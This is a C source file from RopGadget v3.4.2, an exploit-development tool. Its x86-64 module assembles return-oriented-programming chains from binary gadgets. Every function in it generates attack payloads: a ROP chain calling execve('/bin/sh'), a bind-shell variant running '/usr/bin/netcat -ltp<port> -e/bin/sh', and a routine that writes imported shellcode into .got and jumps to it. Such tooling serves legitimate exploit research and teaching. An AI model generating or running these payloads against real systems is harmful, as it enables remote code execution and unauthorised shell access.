/*
** RopGadget - Release v3.4.2
** Jonathan Salwan - http://twitter.com/JonathanSalwan
** Allan Wirth - http://allanwirth.com/
** http://shell-storm.org
** 2012-11-11
**
** This program is free software; you can redistribute it and/or modify
** it under the terms of the GNU General Public License as published by
** the Free Software Foundation; either version 2 of the License, or
** (at your option) any later version.
**
** This program is distributed in the hope that it will be useful,
** but WITHOUT ANY WARRANTY; without even the implied warranty of
** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
** GNU General Public License for more details.
**
** You should have received a copy of the GNU General Public License
** along with this program; if not, write to the Free Software
** Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

#include "ropgadget.h"

static void makepartie2(t_list_inst *, int, int);

/* local: partie 1 | write /bin/sh in .data for execve("/bin/sh", NULL, NULL)*/
/* remote: partie 1 bis | write //usr/bin/netcat -ltp6666 -e///bin//sh in .data */
static void makepartie1(t_list_inst *list_ins, int local)
{
  int argv_start;
  int envp_start;
  t_rop_writer wr;
  char *second_reg;
  char reg_stack[32] = "pop %"; /* Whatever register we use to point to .data */
  char reg_binsh[32] = "pop %rax"; /* Whatever register we use to pop data into */
  char instr_xor[32] = "xor %rax"; /* Whatever register we use to pop data into (for zeroing) */

  wr.mov = get_gadget_by_addr(tab_x8664, ret_addr_makecodefunc(list_ins, "mov %rax,(%r?x)"));

  second_reg = get_reg(wr.mov->instruction, 0);
  strncat(reg_stack, second_reg, 3);
  wr.reg_target = &reg_stack[0];

  wr.pop_target = get_gadget_by_addr(tab_x8664, ret_addr_makecodefunc(list_ins, reg_stack));
  wr.pop_data = get_gadget_by_addr(tab_x8664, ret_addr_makecodefunc(list_ins, reg_binsh));

  wr.zero_data = get_gadget_by_addr(tab_x8664, ret_addr_makecodefunc(list_ins, instr_xor));

  wr.reg_data = &reg_binsh[0];

  free(second_reg);

  fprintf(stdout, "\t%sPayload%s\n", YELLOW, ENDC);
  if (local)
    {
      char *argv[] = {"/bin/sh", NULL};

      fprintf(stdout, "\t\t%s# execve /bin/sh generated by RopGadget v3.4.2%s\n", BLUE, ENDC);

      sc_print_argv((const char * const *)&argv[0], &wr, 0, TRUE, 8, &argv_start, &envp_start);
    }
  else
    {
      char opts[9] = {0};
      char *argv[] = {"/usr/bin/netcat", NULL, "-e/bin/sh", NULL};
      argv[1] = &opts[0];

      fprintf(stdout, "\t\t%s# execve /bin/sh bindport %d generated by RopGadget v3.4.2%s\n", BLUE, bind_mode.port, ENDC);

      sprintf(opts, "-ltp%d", bind_mode.port);

      sc_print_argv((const char * const *)&argv[0], &wr, 0, TRUE, 8, &argv_start, &envp_start);
    }
    makepartie2(list_ins, argv_start, envp_start);
}

/* local: partie 2 init reg => %ebx = "/bin/sh\0" | %ecx = "\0" | %edx = "\0"  for execve("/bin/sh", NULL, NULL)*/
/* remote: partie 2 bis init reg => %ebx = "/usb/bin/netcat\0" | %ecx = arg | %edx = "\0" */
static void makepartie2(t_list_inst *list_ins, int argv_start, int envp_start)
{
  Elf32_Addr addr_pop_ebx;
  Elf32_Addr addr_pop_ecx;
  Elf32_Addr addr_pop_edx;
  char *pop_ebx_gadget;
  char *pop_ecx_gadget;
  char *pop_edx_gadget;

  Elf32_Addr addr_xor_eax;
  Elf32_Addr addr_inc_eax;
  Elf32_Addr addr_int_0x80;
  Elf32_Addr addr_sysenter;
  Elf32_Addr addr_pop_ebp;
  char *pop_ebp_gadget;
  char *xor_eax_gadget;
  char *inc_eax_gadget;
  int i;

  const char *pop_ebx = "pop %rbx";
  const char *pop_ecx = "pop %rcx";
  const char *pop_edx = "pop %rdx";
  const char *xor_eax = "xor %rax,%rax";
  const char *inc_eaxs[] = {"inc %rax", "inc %eax", "inc %ax", "inc %al", NULL};
  const char *inc_eax = inc_eaxs[0];
  const char *int_80 = "int $0x80";
  const char *sysenter = "sysenter";
  const char *pop_ebp = "pop %rbp";

  addr_pop_ebx = ret_addr_makecodefunc(list_ins, pop_ebx);
  addr_pop_ecx = ret_addr_makecodefunc(list_ins, pop_ecx);
  addr_pop_edx = ret_addr_makecodefunc(list_ins, pop_edx);
  pop_ebx_gadget = get_gadget_since_addr_att(tab_x8664, addr_pop_ebx);
  pop_ecx_gadget = get_gadget_since_addr_att(tab_x8664, addr_pop_ecx);
  pop_edx_gadget = get_gadget_since_addr_att(tab_x8664, addr_pop_edx);

  addr_xor_eax = ret_addr_makecodefunc(list_ins, xor_eax);
  xor_eax_gadget = get_gadget_since_addr_att(tab_x8664, addr_xor_eax);

  for (i = 0, addr_inc_eax = 0; inc_eaxs[i] != NULL && addr_inc_eax == 0; i++)
    {
      inc_eax = inc_eaxs[i];
      addr_inc_eax = ret_addr_makecodefunc(list_ins, inc_eax);
    }
  inc_eax_gadget = get_gadget_since_addr_att(tab_x8664, addr_inc_eax);

  addr_int_0x80 = ret_addr_makecodefunc(list_ins, int_80);
  addr_sysenter = ret_addr_makecodefunc(list_ins, sysenter);
  addr_pop_ebp  = ret_addr_makecodefunc(list_ins, pop_ebp);
  pop_ebp_gadget = get_gadget_since_addr_att(tab_x8664, addr_pop_ebp);

  /* set %ebx (program name) */
  sc_print_code_padded(addr_pop_ebx, pop_ebx_gadget, pop_ebx, 8);
  sc_print_sect_addr_padded(0, TRUE, pop_ebx_gadget, pop_ebx, 8);

  /* set %ecx (arguments) */
  sc_print_code_padded(addr_pop_ecx, pop_ecx_gadget, pop_ecx, 8);
  sc_print_sect_addr_padded(argv_start, TRUE, pop_ecx_gadget, pop_ecx, 8);

  /* set %edx (environment) */
  sc_print_code_padded(addr_pop_edx, pop_edx_gadget, pop_edx, 8);
  sc_print_sect_addr_padded(envp_start, TRUE, pop_edx_gadget, pop_edx, 8);

  /* set %eax => 0 */
  sc_print_code(addr_xor_eax, 8, xor_eax_gadget);
  sc_print_padding(how_many_pop(xor_eax_gadget), 8);

  /* set %eax => 0xb for sys_execve() */
  for (i = 0; i != 0xb; i++)
    sc_print_code_padded1(addr_inc_eax, inc_eax_gadget, 8);

  if (addr_int_0x80)
    sc_print_code(addr_int_0x80, 8, int_80);
  else if (addr_sysenter)
    {
      sc_print_code(addr_pop_ebp, 8, pop_ebp_gadget);
      sc_print_sect_addr(0, TRUE, 8);
      sc_print_code(addr_sysenter, 8, sysenter);
    }
}

void x8664_makecode(t_list_inst *list_ins)
{
  makepartie1(list_ins, !bind_mode.flag);
  fprintf(stdout, "\t%sEOF Payload%s\n", YELLOW, ENDC);
  free_list_inst(list_ins);
}

static int check_opcode_was_found(void)
{
  size_t i;

  if (!importsc_mode.poctet)
    return FALSE;

  for (i = 0; importsc_mode.poctet->next != NULL; importsc_mode.poctet = importsc_mode.poctet->next)
    i++;

  return (i == importsc_mode.size - 1);
}

/* partie 1 | import shellcode in ROP instruction */
static void makepartie1_importsc(t_list_inst *list_ins, int useless, char *pop_reg)
{
/*
  gad1 pop %e?x
  gad2 mov (%e?x),%e?x
  gad3 mov %e?x,%e?x
  gad4 mov %e?x,(%e?x)
*/

  size_t i;
  Elf32_Addr addr_gad1;
  Elf32_Addr addr_gad2;
  Elf32_Addr addr_gad3;
  Elf32_Addr addr_gad4;
  char *gad1;
  char *gad2;
  char *gad3;
  char *gad4;
  char comment[32] = {0};

  addr_gad1 = ret_addr_makecodefunc(list_ins, pop_reg);
  gad1      = get_gadget_since_addr_att(tab_x8664, addr_gad1);
  addr_gad2 = ret_addr_makecodefunc(list_ins, "mov (%r?x),%r?x");
  gad2      = get_gadget_since_addr_att(tab_x8664, addr_gad2);
  addr_gad3 = ret_addr_makecodefunc(list_ins, "mov %r?x,%r?x");
  gad3      = get_gadget_since_addr_att(tab_x8664, addr_gad3);
  addr_gad4 = ret_addr_makecodefunc(list_ins, "mov %r?x,(%r?x)");
  gad4      = get_gadget_since_addr_att(tab_x8664, addr_gad4);

  /* check if all opcodes about shellcode was found in .text */
  if (!check_opcode_was_found())
    {
      fprintf(stdout, "\t%sPayload%s\n", YELLOW, ENDC);
      fprintf(stdout, "\t%s/!\\ Impossible to generate your shellcode because some opcode was not found.%s\n", RED, ENDC);
      return ;
    }

  fprintf(stdout, "\t%sPayload%s\n", YELLOW, ENDC);
  fprintf(stdout, "\t\t%s# Shellcode imported! Generated by RopGadget v3.4.2%s\n", BLUE, ENDC);

  for (i = 0; i != importsc_mode.size && importsc_mode.poctet != NULL; i++, importsc_mode.poctet = importsc_mode.poctet->back)
    {
      /* pop %edx */
      sc_print_code_padded(addr_gad1, gad1, pop_reg, 8);

      sprintf(comment, "0x%.2x", importsc_mode.poctet->octet);

      sc_print_code(importsc_mode.poctet->addr, 8, comment);
      sc_print_padding(how_many_pop_after(gad1, pop_reg), 8);
      /* mov (%edx),%ecx */
      sc_print_code_padded1(addr_gad2, gad2, 8);
      if (useless < 0)
        /* mov %ecx,%eax */
        sc_print_code_padded1(addr_gad3, gad3, 8);
      /* pop %edx */
      sc_print_code_padded(addr_gad1, gad1, pop_reg, 8);
      sc_print_sect_addr_padded(i, FALSE, gad1, pop_reg, 8);
      /* mov %eax,(%edx) */
      sc_print_code_padded1(addr_gad4, gad4, 8);
    }
  sc_print_code((Elf32_Addr)Addr_sGot, 8, "jump to our shellcode in .got");
}

void x8664_makecode_importsc(t_list_inst *list_ins, int useless, char *pop_reg)
{
  makepartie1_importsc(list_ins, useless, pop_reg);
  fprintf(stdout, "\t%sEOF Payload%s\n", YELLOW, ENDC);
  free_list_inst(list_ins);
}